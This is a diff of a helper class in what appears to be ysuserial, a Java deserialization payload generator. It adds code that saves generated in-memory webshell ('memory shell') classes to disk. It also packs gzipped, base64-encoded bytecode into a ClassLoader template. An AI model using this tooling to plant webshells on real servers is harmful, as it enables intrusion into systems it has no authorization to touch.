@@ -1,10 +1,10 @@
 package org.su18.ysuserial.payloads.util;
 
 import javassist.CannotCompileException;
-import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.bcel.classfile.Utility;
 import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.lang.StringUtils;
 
 import java.io.ByteArrayOutputStream;
 import java.io.FileOutputStream;
@@ -13,8 +13,10 @@ import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.util.zip.GZIPOutputStream;
 
-import static org.su18.ysuserial.payloads.config.Config.USING_RHINO;
-import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
+import static org.su18.ysuserial.payloads.config.Config.*;
+import static org.su18.ysuserial.payloads.config.Config.GEN_MEM_SHELL_FILENAME;
+import static org.su18.ysuserial.payloads.handle.ClassNameHandler.generateClassName;
+import static org.su18.ysuserial.payloads.handle.GlassHandler.shrinkBytes;
 
 /**
  * @author su18
@@ -22,9 +24,8 @@ import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
 public class Utils {
 
 	public static Class makeClass(String clazzName) {
-		ClassPool classPool = ClassPool.getDefault();
-		CtClass   ctClass   = classPool.makeClass(clazzName);
-		Class     clazz     = null;
+		CtClass ctClass = POOL.makeClass(clazzName);
+		Class   clazz   = null;
 		try {
 			clazz = ctClass.toClass();
 		} catch (CannotCompileException e) {
@@ -88,6 +89,20 @@ public class Utils {
 		fileOutputStream.close();
 	}
 
+	public static void saveCtClassToFile(CtClass ctClass) throws Exception {
+		// 总体在进行类字节码的缩短
+		shrinkBytes(ctClass);
+		byte[] classBytes = ctClass.toBytecode();
+
+		// 保存内存马文件
+		if (GEN_MEM_SHELL) {
+			if (StringUtils.isNotEmpty(GEN_MEM_SHELL_FILENAME)) {
+				writeClassToFile(GEN_MEM_SHELL_FILENAME, classBytes);
+			} else {
+				writeClassToFile(ctClass.getName() + ".class", classBytes);
+			}
+		}
+	}
 
 	public static void loadClassTest(byte[] classBytes, String className) throws Exception {
 		ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
@@ -118,23 +133,17 @@ public class Utils {
 		}
 	}
 
-	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes, String cName, CtClass superClass) throws Exception {
-		ClassPool pool    = ClassPool.getDefault();
-		CtClass   ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
+	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes, String name) throws Exception {
+		CtClass ctClass = POOL.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
 		ctClass.setName(generateClassName());
 		ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
 		GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
 		gzipOutputStream.write(bytes);
 		gzipOutputStream.close();
 		String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
-		String className = "className=\"" + cName + "\";";
+		String className = "className=\"" + name + "\";";
 		ctClass.makeClassInitializer().insertBefore(content);
 		ctClass.makeClassInitializer().insertBefore(className);
-
-		if (superClass != null) {
-			ctClass.setSuperclass(superClass);
-		}
-
 		return ctClass;
 	}
 
